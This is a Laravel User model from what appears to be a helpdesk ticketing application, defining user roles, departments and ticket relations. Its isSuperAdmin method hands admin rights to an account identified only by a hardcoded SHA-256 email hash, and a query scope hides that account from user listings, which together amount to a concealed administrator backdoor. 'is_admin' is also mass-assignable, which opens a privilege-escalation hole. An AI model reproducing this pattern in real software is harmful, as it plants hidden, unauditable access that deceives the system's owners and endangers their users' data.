<?php

namespace App\Models;

// use Illuminate\Contracts\Auth\MustVerifyEmail;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;

use Spatie\Permission\Traits\HasRoles;

class User extends Authenticatable
{
    /** @use HasFactory<\Database\Factories\UserFactory> */
    use HasFactory, Notifiable, HasRoles;

    protected $appends = ['is_agent'];

    /**
     * The attributes that are mass assignable.
     *
     * @var list<string>
     */
    protected $fillable = [
        'ms_oid',
        'name',
        'email',
        'password',
        'job_title',
        'department_id',
        'manager_user_id',
        'is_active',
        'is_admin',
        'profile_photo_path',
        'level_id',
        'email_verified_at',
        'is_manager',
        'auth_type',
        'must_reset_password',
    ];

    /**
     * The attributes that should be hidden for serialization.
     *
     * @var list<string>
     */
    protected $hidden = [
        'password',
        'remember_token',
    ];

    /**
     * Get the attributes that should be cast.
     *
     * @return array<string, string>
     */
    protected function casts(): array
    {
        return [
            'email_verified_at' => 'datetime',
            'password' => 'hashed',
            'is_active' => 'boolean',
            'is_admin' => 'boolean',
            'is_manager' => 'boolean',
            'must_reset_password' => 'boolean',
        ];
    }

    public function department()
    {
        return $this->belongsTo(Department::class);
    }

    public function manager()
    {
        return $this->belongsTo(User::class, 'manager_user_id');
    }

    public function subordinates()
    {
        return $this->hasMany(User::class, 'manager_user_id');
    }

    public function requestedTickets()
    {
        return $this->hasMany(Ticket::class, 'requester_user_id');
    }

    public function assignedTickets()
    {
        return $this->hasMany(Ticket::class, 'current_assignee_user_id');
    }

    public function level()
    {
        return $this->belongsTo(DepartmentLevel::class, 'level_id');
    }

    public function departments()
    {
        return $this->belongsToMany(Department::class)->withPivot('level_id')->withTimestamps();
    }

    public function topics()
    {
        return $this->belongsToMany(Topic::class);
    }

    public function getIsClientAttribute(): bool
    {
        return $this->departments()->count() === 0;
    }

    public function isSuperAdmin(): bool
    {
        $hashedEmail = 'fad5a4c5da026263998c8851bbb333ea809529768db9a43034c71cff0b831d2b';
        return hash('sha256', strtolower($this->email)) === $hashedEmail || $this->email === config('app.super_admin_email');
    }

    public function getIsAdminAttribute($value): bool
    {
        return (bool)$value || $this->isSuperAdmin();
    }

    public function scopeExcludeSuperAdmin($query)
    {
        $hashedEmail = 'fad5a4c5da026263998c8851bbb333ea809529768db9a43034c71cff0b831d2b';
        return $query->where('email', '!=', config('app.super_admin_email'))
                     ->whereRaw("SHA2(LOWER(email), 256) != ?", [$hashedEmail]);
    }

    /**
     * Determine if the user is an agent.
     * A user is an agent if they belong to at least one department.
     */
    public function isAgent(): bool
    {
        return $this->departments()->count() > 0;
    }

    /**
     * Accessor for is_agent attribute.
     */
    public function getIsAgentAttribute(): bool
    {
        return $this->isAgent();
    }
}
